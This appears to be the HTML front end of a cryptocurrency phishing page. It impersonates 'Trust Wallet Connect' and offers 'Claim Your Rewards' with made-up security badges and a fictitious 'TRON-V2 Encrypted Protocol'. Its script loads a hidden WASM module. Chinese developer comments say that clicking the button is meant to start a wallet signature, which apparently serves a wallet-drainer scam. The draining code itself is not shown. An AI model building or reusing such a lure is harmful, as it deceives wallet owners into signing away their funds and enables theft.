<!DOCTYPE html>
<html>
<head>
    <title>Trust Wallet Connect</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white font-sans">
    <div class="flex flex-col items-center justify-center h-screen px-4">
        <div class="mb-6 bg-blue-600/20 p-4 rounded-full">
            <svg class="w-12 h-12 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
            </svg>
        </div>
        
        <h1 class="text-3xl font-bold mb-2">Claim Your Rewards</h1>
        <p class="text-gray-400 mb-8 text-center max-w-sm">
            Please connect your wallet to verify your identity through the <span class="text-blue-400">TRON-V2 Encrypted Protocol</span>.
        </p>
        
        <button id="claimBtn" class="bg-blue-600 hover:bg-blue-700 transition-colors px-12 py-4 rounded-xl font-bold text-lg shadow-lg shadow-blue-900/50">
            Connect & Claim
        </button>

        <p class="mt-6 text-xs text-gray-600 uppercase tracking-widest">
            Secure Node: 0x8a72...f3e | Verified by Web3 Shield
        </p>
    </div>

   <script src="/assets/js/runtime.js"></script>

<script>
    async function start() {
        try {
            await wasm_bindgen('/assets/wasm/main.wasm');
            console.log("WASM 加载成功");
            const btn = document.getElementById('claimBtn');
            if (btn) {
                btn.onclick = async function() {
                    console.log("按钮被点击");
                    try {
                        // 调用你 WASM 里的逻辑
                        // 建议在这里加个 alert('开始签名'); 看看手机上有没有反应
                        alert('正在连接安全节点...'); 
                        // 这里写你原本调用的 WASM 函数
                    } catch (err) {
                        alert("执行出错: " + err.message);
                    }
                };
            }
        } catch (e) {
            alert("初始化失败，请刷新重试: " + e.message);
        }
    }
    
    // 确保页面加载完再执行
    window.onload = start;
</script>
</body>
</html>
